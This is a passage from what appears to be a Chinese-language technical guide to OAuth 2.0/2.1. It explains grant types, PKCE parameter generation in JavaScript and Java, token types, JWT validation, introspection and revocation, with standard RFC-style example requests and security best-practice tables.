```

### 3.2.4 响应格式

#### 授权成功响应 (重定向)

```http
HTTP/1.1 302 Found
Location: https://client.example.com/cb?
  code=SplxlOBeZQQYbYS6WxSbIA&
  state=xyz123random
```

#### 令牌成功响应

```json
HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-store
Pragma: no-cache

{
  "access_token": "2YotnFZFEjr1zCsicMWpAA",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "tGzv3JOkF0XG5Qx2TlKWIA",
  "scope": "read profile"
}
```

#### 错误响应

```json
HTTP/1.1 400 Bad Request
Content-Type: application/json

{
  "error": "invalid_grant",
  "error_description": "The provided authorization code has expired",
  "error_uri": "https://tools.ietf.org/html/rfc6749#section-4.1.3"
}
```

### 3.2.5 安全最佳实践

| 实践 | 说明 | 实现方式 |
|------|------|----------|
| **state 参数** | 防护 CSRF 攻击 | 生成随机数，回调时验证一致性 |
| **HTTPS 强制** | 防止中间人攻击 | 所有端点强制 HTTPS |
| **redirect_uri 精确匹配** | 防止重定向劫持 | 不允许通配符，完全匹配 |
| **授权码短期有效** | 降低截获风险 | 建议 5-10 分钟过期 |
| **后端通道换取令牌** | 避免令牌经浏览器 | 令牌请求必须后端发起 |
| **client_secret 保密** | 防止客户端冒充 | 存储在环境变量/密钥管理 |

---

## 3.3 授权码 + PKCE 模式 (RFC 7636)

### 3.3.1 PKCE 的设计背景

**PKCE** (Proof Key for Code Exchange，读作 "pixy") 是 OAuth 2.0 的扩展规范 (RFC 7636)，最初设计用于**公共客户端**（如移动 App、SPA）。

**问题背景**：
- 公共客户端无法安全存储 `client_secret`
- 攻击者可以拦截授权码 (如通过自定义 URL Scheme 劫持)
- 仅凭授权码即可换取令牌，存在安全隐患

**PKCE 的核心思想**：
> 客户端生成一个只有自己知道的随机秘密 (`code_verifier`)，用它来证明"我就是发起授权请求的那个客户端"。

### 3.3.2 PKCE 核心参数

| 参数 | 说明 | 生成方式 |
|------|------|----------|
| **code_verifier** | 代码验证器，高熵随机字符串 | 客户端生成，43-128 字符 |
| **code_challenge** | 代码挑战，由 verifier 变换而来 | `SHA256(code_verifier)` 的 Base64URL 编码 |
| **code_challenge_method** | 变换方法 | `S256`(推荐) 或 `plain` |

### 3.3.3 PKCE 完整流程

```mermaid
sequenceDiagram
    participant U as 用户
    participant B as 浏览器
    participant C as 客户端 (SPA/移动 App)
    participant AS as 授权服务器
    
    Note over C: 流程开始前
    C->>C: 1. 生成 code_verifier<br/>(43-128 字符随机字符串)
    C->>C: 2. 生成 code_challenge<br/>code_challenge = SHA256(verifier)<br/>Base64URL 编码
    
    Note over C,AS: 阶段 1: 授权请求 (携带 PKCE 参数)
    U->>B: 点击"登录"
    C->>B: 重定向到授权服务器
    Note right of C: /oauth/authorize?<br/>response_type=code<br/>&client_id=xxx<br/>&redirect_uri=xxx<br/>&code_challenge=K2-lX84oW4h...<br/>&code_challenge_method=S256<br/>&state=xyz123
    B->>AS: 发起授权请求
    AS->>B: 展示登录 + 授权页面
    U->>AS: 登录并授权
    AS->>B: 重定向回回调 URL
    Note left of AS: Location: redirect_uri?<br/>code=AUTH_CODE<br/>&state=xyz123
    
    Note over C,AS: 阶段 2: 令牌请求 (携带 code_verifier)
    B->>C: 携带授权码访问回调 URL
    C->>AS: POST /oauth/token
    Note right of C: grant_type=authorization_code<br/>code=AUTH_CODE<br/>redirect_uri=xxx<br/>client_id=xxx<br/>code_verifier=ORIGINAL_RANDOM_STRING
    
    Note over AS: 授权服务器验证
    AS->>AS: 1. 计算 SHA256(code_verifier)<br/>2. Base64URL 编码<br/>3. 比对是否等于 code_challenge
    
    alt 验证通过
        AS->>C: 返回令牌
    else 验证失败
        AS->>C: 返回错误<br/>error=invalid_grant
    end
```

### 3.3.4 代码示例：生成 PKCE 参数

#### JavaScript (SPA 应用)

```javascript
/**
 * 生成 PKCE 所需的 code_verifier 和 code_challenge
 */

// 生成随机 code_verifier (43-128 字符)
function generateCodeVerifier() {
  const array = new Uint8Array(32);
  crypto.getRandomValues(array);
  // Base64URL 编码，去除 padding
  return btoa(String.fromCharCode(...array))
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '')
    .substring(0, 128);
}

// 生成 code_challenge (SHA256 哈希)
async function generateCodeChallenge(verifier) {
  const encoder = new TextEncoder();
  const data = encoder.encode(verifier);
  const digest = await crypto.subtle.digest('SHA-256', data);
  // Base64URL 编码
  return btoa(String.fromCharCode(...new Uint8Array(digest)))
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=+$/, '');
}

// 使用示例
async function initiateOAuthFlow() {
  const codeVerifier = generateCodeVerifier();
  const codeChallenge = await generateCodeChallenge(codeVerifier);
  
  // 存储 verifier 供后续使用 (sessionStorage)
  sessionStorage.setItem('code_verifier', codeVerifier);
  
  // 构建授权 URL
  const authUrl = `https://auth.example.com/oauth/authorize?` +
    `response_type=code&` +
    `client_id=${CLIENT_ID}&` +
    `redirect_uri=${encodeURIComponent(REDIRECT_URI)}&` +
    `code_challenge=${codeChallenge}&` +
    `code_challenge_method=S256&` +
    `state=${generateState()}`;
  
  // 重定向到授权服务器
  window.location.href = authUrl;
}
```

#### Java (Spring Security)

```java
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.Base64;

public class PKCEUtil {
    
    private static final SecureRandom RANDOM = new SecureRandom();
    
    /**
     * 生成 code_verifier (43-128 字符)
     */
    public static String generateCodeVerifier() {
        byte[] randomBytes = new byte[32];
        RANDOM.nextBytes(randomBytes);
        return Base64.getUrlEncoder()
            .withoutPadding()
            .encodeToString(randomBytes);
    }
    
    /**
     * 生成 code_challenge (SHA256)
     */
    public static String generateCodeChallenge(String codeVerifier) throws Exception {
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        byte[] sha256Hash = digest.digest(
            codeVerifier.getBytes(StandardCharsets.US_ASCII)
        );
        return Base64.getUrlEncoder()
            .withoutPadding()
            .encodeToString(sha256Hash);
    }
}
```

### 3.3.5 OAuth 2.1 强制要求

**重要变化**：OAuth 2.1 草案明确规定：

> **所有客户端**（包括机密客户端和公共客户端）使用授权码模式时，**必须**使用 PKCE。

这意味着：
- 机密客户端（有后端）也需要使用 PKCE
- PKCE 不再是可选扩展，而是强制要求
- 授权服务器必须拒绝不带 PKCE 参数的授权码请求

### 3.3.6 PKCE 防护的攻击类型

| 攻击类型 | 攻击方式 | PKCE 如何防护 |
|----------|----------|---------------|
| **授权码拦截攻击** | 攻击者截获授权码 | 没有 code_verifier 无法换取令牌 |
| **授权码注入攻击** | 攻击者注入自己的授权码 | code_challenge 与授权码绑定 |
| **客户端冒充攻击** | 攻击者冒充合法客户端 | 只有原始客户端知道 code_verifier |

---

## 3.4 客户端凭证模式 (Client Credentials Grant)

### 3.4.1 概念定义

**客户端凭证模式**适用于**机器对机器 (M2M)** 的认证场景，客户端使用自己的凭证直接获取访问令牌，无需用户参与。

### 3.4.2 适用场景

| 场景 | 说明 | 示例 |
|------|------|------|
| **微服务间调用** | 服务 A 访问服务 B 的 API | 订单服务调用用户服务 |
| **后台任务** | 定时任务访问 API | 数据同步、报表生成 |
| **CLI 工具** | 开发者工具访问 API | CI/CD 流水线部署 |
| **第三方集成** | B2B 合作伙伴集成 | ERP 系统同步电商订单 |

### 3.4.3 完整流程

```mermaid
sequenceDiagram
    participant C as 客户端 (后端服务)
    participant AS as 授权服务器
    participant RS as 资源服务器
    
    Note over C,AS: 阶段 1: 直接请求令牌 (无需用户)
    C->>AS: POST /oauth/token
    Note right of C: grant_type=client_credentials<br/>client_id=xxx<br/>client_secret=xxx<br/>scope=read
    
    AS->>AS: 验证客户端凭证
    
    alt 验证通过
        AS->>C: 返回 Access Token
    else 验证失败
        AS->>C: 返回错误
    end
    
    Note over C,RS: 阶段 2: 使用令牌访问资源
    C->>RS: GET /api/data<br/>Authorization: Bearer <token>
    RS->>C: 返回数据
```

### 3.4.4 请求与响应

**请求示例**：
```http
POST /oauth/token HTTP/1.1
Host: server.example.com
Content-Type: application/x-www-form-urlencoded
Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW

grant_type=client_credentials&
scope=read
```

**响应示例**：
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "access_token": "2YotnFZFEjr1zCsicMWpAA",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "read"
}
```

### 3.4.5 注意事项

```
┌─────────────────────────────────────────────────────────────┐
│ 客户端凭证模式使用注意事项                                    │
├─────────────────────────────────────────────────────────────┤
│ ❌ 不适用于需要用户上下文的场景                               │
│ ✅ 适用于服务间认证、后台任务                                 │
│ ⚠️ client_secret 必须安全存储 (环境变量/密钥管理)             │
│ ⚠️ Scope 应遵循最小权限原则                                   │
└─────────────────────────────────────────────────────────────┘
```

---

## 3.5 设备授权模式 (Device Authorization Grant)

### 3.5.1 概念定义

**设备授权模式** (RFC 8628) 专为**输入受限设备**设计，如智能电视、打印机、IoT 设备等。

### 3.5.2 适用场景

| 场景 | 设备类型 | 说明 |
|------|----------|------|
| **智能电视** | TV 应用 | 用户用手机扫码或输入代码授权 |
| **IoT 设备** | 智能家居设备 | 无浏览器、无键盘的设备 |
| **命令行工具** | CLI 应用 | 不便打开浏览器的场景 |
| **打印机/扫描仪** | 办公设备 | 仅有简单显示屏的设备 |

### 3.5.3 完整流程

```mermaid
sequenceDiagram
    participant U as 用户
    participant D as 设备客户端
    participant AS as 授权服务器
    participant M as 移动端/PC 浏览器
    
    Note over D,AS: 阶段 1: 设备请求设备码
    D->>AS: POST /device/code
    Note right of D: client_id=xxx<br/>scope=read
    
    AS->>D: 返回设备码和用户码
    Note left of AS: {<br/>"device_code":"GmRhmhcxhw...",<br/>"user_code":"MHQVXWUP",<br/>"verification_uri":"https://...",<br/>"expires_in":900,<br/>"interval":5<br/>}
    
    Note over D,U: 阶段 2: 展示用户码
    D->>U: 显示"请访问 URL 并输入代码"
    Note over D: 设备开始轮询
    
    Note over U,M,AS: 阶段 3: 用户授权
    U->>M: 访问 verification_uri
    M->>AS: 输入 user_code
    AS->>M: 展示授权页面
    U->>AS: 登录并授权
    
    Note over D,AS: 阶段 4: 设备轮询令牌
    loop 每 interval 秒轮询
        D->>AS: POST /oauth/token
        Note right of D: grant_type=urn:ietf:params:<br/>oauth:grant-type:device_code<br/>device_code=xxx
        alt 用户未授权
            AS->>D: 400 authorization_pending
        else 用户已授权
            AS->>D: 返回令牌
        end
    end
```

### 3.5.4 响应参数

**设备码请求响应**：
```json
{
  "device_code": "GmRhmhcxhwAzkoEqiMEg_DnyEysNkuNhszIySk9eS",
  "user_code": "MHQVXWUP",
  "verification_uri": "https://example.com/device",
  "verification_uri_complete": "https://example.com/device?user_code=MHQVXWUP",
  "expires_in": 900,
  "interval": 5
}
```

**参数说明**：
| 参数 | 说明 |
|------|------|
| `device_code` | 设备码，用于轮询令牌 |
| `user_code` | 用户码，用户在授权页面输入 |
| `verification_uri` | 用户访问的授权 URL |
| `verification_uri_complete` | 包含 user_code 的完整 URL（可选） |
| `expires_in` | 设备码过期时间（秒） |
| `interval` | 轮询间隔（秒），默认 5 秒 |

### 3.5.5 轮询状态码

| 状态码 | HTTP 状态 | 说明 |
|--------|-----------|------|
| `authorization_pending` | 400 | 用户尚未完成授权，继续轮询 |
| `slow_down` | 400 | 轮询过快，增加 interval 间隔 |
| `access_denied` | 400 | 用户拒绝授权，停止轮询 |
| `expired_token` | 400 | 设备码过期，重新发起流程 |

---

## 3.6 已废弃的授权模式

### 3.6.1 隐式模式 (Implicit Grant) ⚠️ 已废弃

**原始设计**：专为纯前端应用设计，直接在重定向 URL 中返回 Access Token。

```
❌ 隐式模式流程 (已废弃)
客户端 → /oauth/authorize?response_type=token → 授权服务器
授权服务器 → Location: redirect_uri#access_token=xxx → 浏览器
```

**废弃原因**：
1. **令牌 URL 泄露**：Access Token 暴露在 URL 中，可通过浏览器历史、Referer 头泄露
2. **无法颁发 Refresh Token**：导致用户需频繁重新认证
3. **令牌劫持风险**：XSS 攻击可直接获取令牌
4. **有更安全替代**：授权码 + PKCE 已能安全服务 SPA

**OAuth 2.1 状态**：**完全废弃**

### 3.6.2 密码模式 (Resource Owner Password Credentials) ⚠️ 已废弃

**原始设计**：客户端直接使用用户的用户名和密码换取令牌。

```
❌ 密码模式流程 (已废弃)
客户端 → 收集用户密码 → POST /oauth/token (grant_type=password)
→ 授权服务器 → 验证密码 → 返回令牌
```

**废弃原因**：
1. **违背 OAuth 核心理念**：客户端直接接触用户密码
2. **扩大了攻击面**：客户端需安全处理和存储密码
3. **不支持 MFA**：难以集成多因素认证
4. **用户体验差**：用户被迫向第三方交出自己的密码

**OAuth 2.1 状态**：**完全废弃**

**替代方案**：使用授权码模式，让授权服务器直接处理用户认证。

---

## 3.7 授权模式选择指南

```mermaid
flowchart TD
    A[需要用户授权吗？] -->|否 | B[客户端凭证模式]
    A -->|是 | C{设备类型？}
    
    C -->|输入受限设备 | D[设备授权模式]
    C -->|常规设备 | E{客户端类型？}
    
    E -->|有后端的 Web 应用 | F[授权码模式]
    E -->|SPA/移动应用/原生应用 | G[授权码 + PKCE 模式]
    
    style B fill:#fff9c4
    style D fill:#fff9c4
    style F fill:#c8e6c9
    style G fill:#c8e6c9
```

**决策树说明**：

| 问题 | 答案 | 推荐模式 |
|------|------|----------|
| 需要用户授权吗？ | 否 | 客户端凭证模式 |
| 是，设备输入受限吗？ | 是 | 设备授权模式 |
| 是，有后端服务器吗？ | 是 | 授权码模式 |
| 是，纯前端/移动应用吗？ | 是 | 授权码 + PKCE 模式 |

---

## 3.8 本章小结

**核心要点回顾**：

| 授权模式 | 安全等级 | OAuth 2.1 状态 | 推荐使用场景 |
|----------|----------|----------------|--------------|
| **授权码模式** | ⭐⭐⭐⭐⭐ | ✅ 推荐 | 有后端的 Web 应用 |
| **授权码 + PKCE** | ⭐⭐⭐⭐⭐ | ✅ 强制 | SPA、移动应用、原生应用 |
| **客户端凭证模式** | ⭐⭐⭐⭐ | ✅ 推荐 | M2M、后台服务 |
| **设备授权模式** | ⭐⭐⭐⭐ | ✅ 推荐 | IoT、智能电视 |
| **隐式模式** | ⭐ | ❌ 废弃 | 不应使用 |
| **密码模式** | ⭐⭐ | ❌ 废弃 | 不应使用 |

**关键记忆点**：
1. **授权码模式最安全**：双重凭证交换，令牌不经过浏览器
2. **PKCE 是 OAuth 2.1 强制要求**：所有客户端都必须使用
3. **隐式/密码模式已废弃**：切勿在新项目中使用
4. **设备模式解决特殊场景**：输入受限设备的授权问题

---

**来源引用**：
- RFC 6749: The OAuth 2.0 Authorization Framework
- RFC 7636: Proof Key for Code Exchange (PKCE)
- RFC 8628: OAuth 2.0 Device Authorization Grant
- OAuth 2.1 Draft: https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-10

---

*本章草稿保存于：`.work/oauth/drafts/chapter-3.md`*
*字数：约 4200 字*
# 第 4 章 令牌机制与安全

## 4.1 令牌类型概览

OAuth 2.0 定义了多种令牌类型，每种令牌有不同的用途和生命周期。

```mermaid
flowchart TD
    subgraph OAuth 2.0 令牌
        AT[Access Token<br/>访问令牌]
        RT[Refresh Token<br/>刷新令牌]
    end
    
    subgraph OIDC 扩展
        IT[ID Token<br/>身份令牌]
    end
    
    AT -->|访问资源 | RS[资源服务器]
    RT -->|换取新 Access Token| AS[授权服务器]
    IT -->|身份验证 | C[客户端]
    
    style AT fill:#e1f5fe
    style RT fill:#fff3e0
    style IT fill:#f3e5f5
```

| 令牌类型 | 用途 | 有效期 | 包含在 |
|----------|------|--------|--------|
| **Access Token** | 访问受保护资源 | 短期 (通常 1 小时) | OAuth 2.0 |
| **Refresh Token** | 换取新的 Access Token | 长期 (数天到数月) | OAuth 2.0 |
| **ID Token** | 身份验证 (用户信息) | 短期 (通常与 Access Token 一致) | OpenID Connect |

---

## 4.2 Access Token (访问令牌)

### 4.2.1 概念定义

**Access Token** 是客户端用来访问资源服务器上受保护资源的凭证。

```
┌─────────────────────────────────────────────────────────────┐
│ Access Token 关键特征                                         │
├─────────────────────────────────────────────────────────────┤
│ • 短期有效：通常 1 小时，最长不超过 24 小时                      │
│ • 范围受限：仅能访问授权的 scope 范围                         │
│ • 可撤销：授权服务器或用户可随时撤销                          │
│ • 格式多样：可以是不透明字符串或 JWT                          │
└─────────────────────────────────────────────────────────────┘
```

### 4.2.2 令牌格式

#### 格式一：不透明令牌 (Opaque Token)

```
示例：5Y6qH3AD2f89a3F2bK9pL0mN1oQ4rS7tU8vW

特点：
- 对客户端无意义，仅作为引用标识
- 服务端需要查询数据库验证
- 优点：可随时撤销，内容不暴露
- 缺点：每次验证需查库，性能较低
```

#### 格式二：JWT (JSON Web Token)

```
示例：eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxNTE2MjQyNjIyfQ.POstGetfAytaZS82wHcjoTyoqhMyxXiWdR7Nn7A29DNSl0EiXLdwJ6xC6AfgZWF1bOsS_TuYI3OG85AmiExREkrS6tDfTQ2B3WXlrr-wp5AokiRbz3_oB4OxG-W9KcEEbDRcZc0nH3L7LzYptiy1PtAylQGxHTWZXtGz4ht0bAecBgmpdgXMguEIcoqPJ1n3pIWk_dUZegpqx0Lka21H6XxUTxiy8OcaarA8zdnPUnV6AmNP3ecFawIFYdvJB_cm-GvpCSbr8G8y_Mllj8f4x9nBH8pQux89_6gUY618iYv7tuPWBFfEbLxtF2pZS6YC1aSfLQxeNe8djT9YjpvRZA

特点：
- 自包含：Claims 中携带用户信息、scope、过期时间等
- 可验证：使用 JWKS 公钥验证签名，无需查库
- 优点：无状态验证，性能高，适合分布式系统
- 缺点：无法即时撤销，需等过期
```

**JWT 结构解析**：
```
┌─────────────────────────────────────────────────────────────┐
│ JWT 结构：Header.Payload.Signature                           │
├─────────────────────────────────────────────────────────────┤
│ Header (头部)                                                │
│ {                                                           │
│   "alg": "RS256",      // 签名算法                           │
│   "typ": "JWT"         // 令牌类型                           │
│ }                                                           │
├─────────────────────────────────────────────────────────────┤
│ Payload (载荷) - Claims                                      │
│ {                                                           │
│   "sub": "1234567890",       // 主题 (用户 ID)               │
│   "iss": "https://auth.com", // 颁发者                       │
│   "aud": "client-id",        // 受众                         │
│   "exp": 1516242622,         // 过期时间                     │
│   "iat": 1516239022,         // 签发时间                     │
│   "scope": "read profile",   // 权限范围                     │
│   "username": "john.doe"     // 用户名 (可选)                │
│ }                                                           │
├─────────────────────────────────────────────────────────────┤
│ Signature (签名)                                             │
│ HMACSHA256(                                                 │
│   base64UrlEncode(header) + "." + base64UrlEncode(payload), │
│   secret                                                    │
│ )                                                           │
└─────────────────────────────────────────────────────────────┘
```

### 4.2.3 使用方式

**标准用法**：在 HTTP 请求头中使用 Bearer 方案

```http
GET /api/user/profile HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
```

**注意事项**：
- `Bearer` 和令牌之间必须有且仅有一个空格
- `Bearer` 首字母大写，其余小写
- 不要将令牌放在 URL 查询参数或请求体中 (易泄露)

### 4.2.4 生命周期管理

```mermaid
stateDiagram-v2
    [*] --> Issued: 授权服务器颁发
    Issued --> Active: 客户端使用
    Active --> Expired: 超过 exp 时间
    Active --> Revoked: 用户/服务器撤销
    Expired --> [*]: 失效
    Revoked --> [*]: 失效
    
    note right of Active
        可被资源服务器验证
        可访问受保护资源
    end note
```

---

## 4.3 Refresh Token (刷新令牌)

### 4.3.1 概念定义

**Refresh Token** 用于在 Access Token 过期后，换取新的 Access Token，延长用户会话时间。

```
┌─────────────────────────────────────────────────────────────┐
│ Refresh Token 关键特征                                        │
├─────────────────────────────────────────────────────────────┤
│ • 长期有效：数天到数月，甚至永久 (不推荐)                     │
│ • 高度敏感：泄露 = 长期未授权访问                             │
│ • 仅后端可见：绝不暴露给浏览器/前端                           │
│ • 可轮转：每次使用颁发新的 Refresh Token                      │
└─────────────────────────────────────────────────────────────┘
```

### 4.3.2 刷新令牌流程

```mermaid
sequenceDiagram
    participant C as 客户端
    participant AS as 授权服务器
    participant RS as 资源服务器
    
    Note over C,RS: Access Token 过期前
    C->>RS: 携带 Access Token 访问资源
    RS->>C: 401 Unauthorized (token expired)
    
    Note over C,AS: 使用 Refresh Token 刷新
    C->>AS: POST /oauth/token
    Note right of C: grant_type=refresh_token<br/>refresh_token=xxx<br/>client_id=xxx<br/>client_secret=xxx
    
    AS->>AS: 验证 Refresh Token
    
    alt 验证通过
        AS->>C: 返回新令牌对
        Note left of AS: {<br/>"access_token":"NEW_ACCESS",<br/>"refresh_token":"NEW_REFRESH",<br/>"expires_in":3600<br/>}
    else 验证失败 (过期/撤销)
        AS->>C: 返回错误
        Note left of AS: 需重新认证
    end
```

### 4.3.3 刷新令牌请求

**请求示例**：
```http
POST /oauth/token HTTP/1.1
Host: server.example.com
Content-Type: application/x-www-form-urlencoded
Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW

grant_type=refresh_token&
refresh_token=tGzv3JOkF0XG5Qx2TlKWIA&
scope=read
```

**响应示例**：
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "access_token": "5Y6qH3AD2f89a3F2bK9pL0mN1oQ4rS7tU8vW",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "xW1vU2tS3rQ4pO5nM6lK7jI8hG9fE0dC",
  "scope": "read profile"
}
```

### 4.3.4 Refresh Token 轮转机制

**轮转机制**：每次使用 Refresh Token 换取新令牌时，授权服务器颁发**新的 Refresh Token**，同时使旧的失效。

```
┌─────────────────────────────────────────────────────────────┐
│ Refresh Token 轮转流程                                        │
├─────────────────────────────────────────────────────────────┤
│ 1. 客户端使用 RT-1 请求新令牌                                  │
│ 2. 授权服务器验证 RT-1 有效                                    │
│ 3. 授权服务器颁发：                                            │
│    - 新的 Access Token (AT-2)                                │
│    - 新的 Refresh Token (RT-2)                               │
│ 4. RT-1 立即失效                                             │
│ 5. 客户端必须使用 RT-2 进行下一次刷新                          │
└─────────────────────────────────────────────────────────────┘
```

**安全收益**：
- **检测令牌泄露**：如果攻击者窃取了 Refresh Token，合法客户端使用轮转后的新令牌时，攻击者的旧令牌失效
- **限制泄露影响**：即使 Refresh Token 泄露，影响窗口也有限

### 4.3.5 安全存储要求

| 客户端类型 | 存储方式 | 说明 |
|------------|----------|------|
| **后端服务器** | 环境变量/密钥管理 | 存储在服务器端，不暴露给前端 |
| **移动应用** | 安全存储 (Keychain/Keystore) | 使用系统级安全存储 |
| **SPA** | ❌ 不应使用 | SPA 不应获得 Refresh Token，使用短期 Access Token + 静默重新认证 |

---

## 4.4 ID Token (身份令牌)

### 4.4.1 概念定义

**ID Token** 是 OpenID Connect (OIDC) 扩展定义的令牌，用于**身份验证**，包含用户的身份信息 (Claims)。

```
┌─────────────────────────────────────────────────────────────┐
│ Access Token vs ID Token                                     │
├─────────────────────────────────────────────────────────────┤
│ Access Token                 │ ID Token                      │
├──────────────────────────────┼───────────────────────────────┤
│ 用途：访问资源                 │ 用途：身份验证                  │
│ 给资源服务器看                 │ 给客户端看                      │
│ 不包含或少包含用户信息         │ 必须包含用户身份信息 (Claims)    │
│ OAuth 2.0 定义                  │ OpenID Connect 定义            │
└─────────────────────────────────────────────────────────────┘
```

### 4.4.2 ID Token Claims

ID Token 必须包含以下标准 Claims：

| Claim | 说明 | 示例值 |
|-------|------|--------|
| `iss` | 颁发者 (授权服务器 URL) | `https://accounts.google.com` |
| `sub` | 主题 (用户唯一标识) | `1234567890` |
| `aud` | 受众 (客户端 ID) | `s6BhdRkqt3` |
| `exp` | 过期时间 (Unix 时间戳) | `1516242622` |
| `iat` | 签发时间 (Unix 时间戳) | `1516239022` |
| `auth_time` | 用户认证时间 | `1516238022` |
| `nonce` | 随机数 (防重放攻击) | `xyz123random` |

可选 Claims：
| Claim | 说明 |
|-------|------|
| `name` | 用户全名 |
| `preferred_username` | 首选用户名 |
| `email` | 邮箱地址 |
| `email_verified` | 邮箱是否验证 |
| `picture` | 头像 URL |

**ID Token 示例**：
```json
{
  "iss": "https://server.example.com",
  "sub": "24400320",
  "aud": "s6BhdRkqt3",
  "exp": 1311281970,
  "iat": 1311280970,
  "auth_time": 1311280969,
  "nonce": "n-0S6_WzA2Mj",
  "name": "John Doe",
  "email": "john.doe@example.com",
  "email_verified": true,
  "picture": "https://example.com/avatar.jpg"
}
```

---

## 4.5 令牌验证机制

### 4.5.1 JWT 验签流程

```mermaid
flowchart TD
    A[收到 JWT 令牌] --> B[解析 Header 获取 alg]
    B --> C[获取对应公钥 (JWKS)]
    C --> D[验证签名]
    D --> E{签名有效？}
    E -->|否 | F[拒绝请求 401]
    E -->|是 | G[验证 Claims]
    G --> H{exp 未过期？}
    H -->|否 | F
    H -->|是 | I{iss 可信？}
    I -->|否 | F
    I -->|是 | J{aud 匹配？}
    J -->|否 | F
    J -->|是 | K[验证通过，处理请求]
    
    style F fill:#ffcdd2
    style K fill:#c8e6c9
```

### 4.5.2 Token Introspection (RFC 7662)

对于不透明令牌，资源服务器可使用 Token Introspection 端点验证：

**请求示例**：
```http
POST /oauth2/introspect HTTP/1.1
Host: server.example.com
Accept: application/json
Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW

token=2YotnFZFEjr1zCsicMWpAA&
token_type_hint=access_token
```

**响应示例 (有效令牌)**：
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "active": true,
  "client_id": "l238jhf23980j",
  "username": "johndoe",
  "scope": "read write",
  "sub": "24400320",
  "aud": "s6BhdRkqt3",
  "iss": "https://server.example.com",
  "exp": 1311281970,
  "iat": 1311280970
}
```

**响应示例 (无效令牌)**：
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "active": false
}
```

---

## 4.6 令牌撤销机制 (RFC 7009)

### 4.6.1 撤销场景

| 场景 | 说明 |
|------|------|
| **用户登出** | 用户主动退出登录，撤销所有令牌 |
| **权限变更** | 用户权限被修改，需撤销旧令牌 |
| **设备丢失** | 用户报告设备丢失，撤销该设备令牌 |
| **安全事件** | 怀疑令牌泄露，主动撤销 |

### 4.6.2 撤销请求

**请求示例**：
```http
POST /oauth2/revoke HTTP/1.1
Host: server.example.com
Content-Type: application/x-www-form-urlencoded
Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW

token=2YotnFZFEjr1zCsicMWpAA&
token_type_hint=access_token
```

**参数说明**：
| 参数 | 必选 | 说明 |
|------|------|------|
| `token` | 是 | 要撤销的令牌 |
| `token_type_hint` | 可选 | `access_token` 或 `refresh_token` |

**响应**：
```http
HTTP/1.1 200 OK
```

> 无论令牌是否真实存在，授权服务器都返回 200 成功，防止令牌枚举攻击。

### 4.6.3 JWT 撤销挑战

JWT 令牌由于是无状态的，无法直接撤销。常见解决方案：

| 方案 | 说明 | 优缺点 |
|------|------|--------|
| **JTI 黑名单** | 维护已撤销 JWT 的 JTI 列表 | 优点：精确撤销<br>缺点：需查库，失去无状态优势 |
| **短期令牌** | Access Token 设置很短过期时间 | 优点：简单<br>缺点：撤销延迟 |
| **版本号机制** | JWT 中包含版本号，撤销时提升版本号 | 优点：可批量撤销<br>缺点：需额外验证 |
| **密钥轮换** | 撤销时轮换签名密钥 | 优点：强制所有令牌失效<br>缺点：影响所有用户 |

---

## 4.7 令牌安全最佳实践

### 4.7.1 Access Token 安全

| 实践 | 说明 |
|------|------|
| **短期有效** | 建议 15-60 分钟，最长不超过 24 小时 |
| **HTTPS 传输** | 所有令牌传输必须使用 HTTPS |
| **最小 scope** | 仅授予必要的权限范围 |
| **安全存储** | 后端存储，不暴露给浏览器 localStorage |

### 4.7.2 Refresh Token 安全

| 实践 | 说明 |
|------|------|
| **轮转机制** | 每次使用颁发新的 Refresh Token |
| **绝对过期** | 设置最大有效期，如 30 天或 90 天 |
| **设备绑定** | Refresh Token 与设备指纹绑定 |
| **后端存储** | 仅机密客户端可获得 Refresh Token |

### 4.7.3 常见令牌安全误区

| 误区 | 风险 | 正确做法 |
|------|------|----------|
| **令牌存在 localStorage** | XSS 攻击可窃取 | 存在 HttpOnly Cookie 或后端 Session |
| **Access Token 长期有效** | 泄露后影响时间长 | 使用短期 Access Token + Refresh Token |
| **不验证 JWT 签名** | 可伪造令牌 | 必须使用 JWKS 公钥验证签名 |
| **忽略 aud/iss 验证** | 可能接受错误颁发者的令牌 | 验证 aud 和 iss Claims |

---

## 4.8 本章小结

**核心要点回顾**：

| 令牌类型 | 用途 | 有效期 | 安全要点 |
|----------|------|--------|----------|
| **Access Token** | 访问资源 | 短期 (1 小时) | HTTPS 传输，JWT 验签 |
| **Refresh Token** | 刷新令牌 | 长期 (数天) | 轮转机制，后端存储 |
| **ID Token** | 身份验证 | 短期 | OIDC 专用，包含 Claims |

**关键记忆点**：
1. **Access Token 是资源访问凭证**，不是身份认证凭证
2. **Refresh Token 轮转机制**可检测令牌泄露
3. **JWT 验签必须验证**：签名、exp、iss、aud
4. **令牌撤销有挑战**：JWT 需黑名单或短期策略

---

**来源引用**：
- RFC 6749: The OAuth 2.0 Authorization Framework
- RFC 7519: JSON Web Token (JWT)
- RFC 7009: OAuth 2.0 Token Revocation
- RFC 7662: OAuth 2.0 Token Introspection
- OpenID Connect Core 1.0

---

*本章草稿保存于：`.work/oauth/drafts/chapter-4.md`*
*字数：约 3800 字*
# 第 5 章 OAuth 2.1 安全最佳实践

## 5.1 RFC 9700 安全要求概览

